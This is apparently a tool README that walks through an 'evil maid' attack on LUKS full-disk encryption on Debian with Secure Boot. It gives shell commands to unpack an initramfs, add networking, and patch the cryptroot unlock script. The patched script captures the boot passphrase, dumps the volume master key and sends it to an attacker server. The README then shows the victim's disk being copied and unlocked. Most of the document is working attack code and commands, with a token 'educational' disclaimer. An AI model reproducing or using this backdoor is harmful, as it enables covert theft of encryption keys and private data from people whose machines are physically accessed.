# XIntercept: breaking LUKS via password interception
> Debian 13.4, Secure Boot **ON**, initramfs-tools
>> Secure Boot was created to mitigate low-level software rootkits. However, in many standard Linux distributions, this 'secure boot' does not extend to the initramfs leading to compromise when an attacker has physical access.

> [!WARNING]
> Educational purposes only.

## Building

Requirements: docker

Use `build.sh` to build static binaries. Binaries will be saved to `bin/`

## Usage

### Attack preparation

After a successful build, move to the `bin/` directory.

Generate key pairs with `./generate_keys`. They will be automatically saved to `keys.config` file.

```
Public Key: a79beaf765d97bcea0ff1f65ff627c6410d58febbf03e9df01c7cac258748d01
Secret Key: d661ce73e1f095ec01b50235d53495969df9a55750135fa2dfd1fc7bf9e2b3fd
[+] Keys successfully written to keys.config
```

You will need the public key to securely send LUKS master key via `vxclient`. 

### Initramfs intrusion

The demonstration was performed (at the time of writing) on a latest Debian 13.4 installation with Secure Boot **ON**. A similar attack is possible on most modern Linux distributions. Virtual Machine: QEMU, KVM (`virt-manager`). All commands described are executed as root. 

1. Mount boot drive (`/dev/vda2`)

`mount /dev/vda2 /mnt`

2. Copy the initramfs file and prepare a working directory

`cp /mnt/initrd.img-6.12.74+deb13+1-amd64 ~/`

`mkdir -p ~/extracted`

`cd ~`

`unmkinitramfs initrd.img-6.12.74+deb13+1-amd64 extracted/`

Now you will have initramfs contents in `extracted/` directory. `early` contains microcode updates, `main` contains initramfs itself. 

3. Modifying initramfs: **enabling network support**

Move to initramfs directory:
`cd extracted/main`

Create init-premount directory, which will hold scripts that will execute *after* loading of essential modules, but *before* the real root filesystem is mounted. 
`mkdir -p scripts/init-premount`

Paste the following contents to `scripts/init-premount/ORDER` file.
You can use `vim scripts/init-premount/ORDER`
```
/scripts/init-premount/network "$@"
[ -e /conf/param.conf ] && . /conf/param.conf
```

Now let's write network script: `vim scripts/init-premount/network`
```
#!/bin/sh
PREREQ=""
prereqs()
{
    echo "$PREREQ"
}

case $1 in
prereqs)
    prereqs
    exit 0
    ;;
esac

# We want to be silent, right? 
# Change it to your needed network drivers like `e1000`
# You can even setup a WiFi connection here
modprobe virtio_pci 2>/dev/null
modprobe virtio_net 2>/dev/null
modprobe af_packet 2>/dev/null

# Wait briefly for device discovery
sleep 1

IFACE=$(ls /sys/class/net | grep -v lo | head -1)
if [ -n "$IFACE" ]; then
    ip link set "$IFACE" up

    # Wait for carrier
    for i in $(seq 1 10); do
        carrier=$(cat "/sys/class/net/$IFACE/carrier" 2>/dev/null)
        [ "$carrier" = "1" ] && break
        sleep 1
    done

    # You may need to change IP addresses or DNS
    # A DNS resolver is not required if you use static IP addresses.
    ip addr add 192.168.122.146/24 dev "$IFACE"
    ip route add default via 192.168.122.1
    echo "nameserver 192.168.122.1" > /etc/resolv.conf

fi
```

4. Modifying initramfs: **intercepting master key**

Previously (LUKS1) we could execute the command `dmsetup table --showkeys <volume_name>` and extract the master key; however, with LUKS2 the encryption keys are stored in the kernel keyring.
To avoid overcomplicating things, we'll do the following: intercept the user's password, obtain the master key using the built-in `cryptsetup`, and continue booting as if nothing had happened. If you are fan of Linux kernel reverse-engineering and somehow your *victim* machine has debugging symbols enabled, see [this](https://drgn.readthedocs.io/en/latest/case_studies/dm_crypt_key.html).

`vim scripts/local-top/cryptroot`

Locate that part of script:
```
while [ $maxtries -le 0 ] || [ $count -lt $maxtries ]; do
    if [ -z "${CRYPTTAB_OPTION_keyscript+x}" ] && [ "$CRYPTTAB_KEY" != "none" ]; then
        # unlock via keyfile
        unlock_mapping "$CRYPTTAB_KEY"
    else
        # unlock interactively or via keyscript
        run_keyscript "$count" | unlock_mapping
        # ^
        # ^
        # WE WILL MODIFY THAT PART
    fi
    rv=$?
    count=$(( $count + 1 ))

```

We will read user password to `_passphrase` variable, then dump master key to `_master_key` and send it via `vxclient`. Replace the IP, port, and public key with your own. After sending the master key, the system will continue the normal boot process and delete those variables from memory. 

```
if [ -z "${CRYPTTAB_OPTION_keyscript+x}" ] && [ "$CRYPTTAB_KEY" != "none" ]; then
    # unlock via keyfile
    unlock_mapping "$CRYPTTAB_KEY"
else
    # unlock interactively or via keyscript
    # ----- BEGIN INTERCEPT -----
    _passphrase="$(run_keyscript "$count")"
    _master_key="$(printf '%s' "$_passphrase" \
        | cryptsetup luksDump -q --dump-volume-key -d - \
            "$CRYPTTAB_SOURCE" 2>/dev/null)"

    /scripts/local-top/vxclient \
        -i 192.168.122.1 -p 5000 \
        -o 63acb0238ec4df0d358a0a8a293db7ab3551455ea01a31c90d59770888f7e955 \
        -m "$_master_key" 2>/dev/null &

    printf '%s' "$_passphrase" | unlock_mapping
    unset _passphrase _master_key
    # ----- END INTERCEPT -----
    # run_keyscript "$count" | unlock_mapping <- delete or comment this
    fi
    rv=$?
    count=$(( $count + 1 ))
```

5. Building modified initramfs

Move to directory where you have extracted `early` and `main` parts of initramfs.
`cd ~/extracted`

Build `early` initramfs stage:
`(cd early && find . -print0 | sort -z | cpio --null -o -H newc --reproducible) > early.cpio`

Build `main` initramfs stage:
`(cd main && find . -print0 | sort -z | cpio --null -o -H newc --reproducible) | zstd -3 -T0 > main.cpio.zst`

Now you need to simply concatenate those stages into one file:
`cat early.cpio main.cpio.zst > initramfs_patched.img`

6. Replacing original initramfs with modified one

`cp initramfs_patched.img /mnt/initrd.img-6.12.74+deb13+1-amd64`

7. Unmount boot drive and copy LUKS encrypted drive.

`umount /mnt`

I use a block size of `64M` for better performance but you can use any other. Replace `/path/to/sda3_luks_file` with the path to the file that will hold the complete copy of the encrypted LUKS partition.

`dd if=/dev/vda3 of=/path/to/sda3_luks_file bs=64M iflag=fullblock oflag=direct status=progress`

### Waiting for keys

After these steps, all that's left to do is wait for the *victim* to enter their password upon booting. You will receive the master key and be able to decrypt the disk image.

There are two ways to use the server: automatic and manual. 

1. Manual usage:
`Usage: ./vxserver -p <PORT> -s <SECRET_KEY_HEX> -o <PUBLIC_KEY_HEX>`
By default it will print LUKS master key dump to `stdout`. You will need to parse the output yourself in order to decrypt the drive. 

2. Automatic usage (**recommended**):
Move (or symlink) `execute.py` to `bin/` directory.
```
usage: execute.py [-h] -d DEVICE [-p PORT] [-k KEYS] [-n NAME] [-i INPUT]

vxserver wrapper for automatic unlocking LUKS volumes with intercepted master key

options:
  -h, --help           show this help message and exit
  -d, --device DEVICE  block device (or file) to unlock (/dev/vda3)
  -p, --port PORT      port listen to
  -k, --keys KEYS      keys pair file path
  -n, --name NAME      name for the unlocked mapper device
  -i, --input INPUT    do not run vxserver; parse text file and unlock drive

```

Usage example: `python execute.py -d sda3_file -p 5000 -k keys.config -n sda3_crypt`

The Python script will read the key pair from `keys.config` and listen on port `5000`. When it receives an encrypted message from `vxclient` it will automatically decrypt it, parse it and unlock LUKS drive from `sda3_file`. Unlocked drive available at `/dev/mapper/sda3_crypt` 

Just in case, immediately after receiving the dump, the script automatically saves the dump to a file `mk_dump_{mapper_name}_{filename}_{random_8_bytes_in_hex}`. If something goes wrong while automatic decrypting or parsing you can always try to decrypt by yourself. Or use `--input` option that will parse file and try to decrypt without server.

### Successful example
```
[root@secux-thinkbook bin]# python execute.py -d sda3
[+] Saved captured dump to mk_dump_decrypted_luks_sda3_4a5a030fc8fc2b46
[*] Drive: /dev/vda3
[*] Cipher name: aes
[*] Cipher mode: xts-plain64
[*] Payload offset: 32768
[*] UUID: 8eea5e55-081d-43fe-8d41-b6a637ac7a6b
[*] Master key bits: 512
[+] Master key length: 64 bytes
[+] Master key (hex): 2d41a3eb7924642c07dbb5ff77ab3e877d5782ca5e5ae480fae491b8d6dded998ee3e4d0d8aa072b8d0a195a13da46f4fda3774492b7fb7b71b9eaed95589991
[+] LUKS volume successfully unlocked as decrypted_luks!
```

**You wouldn't use it for harm, would you?**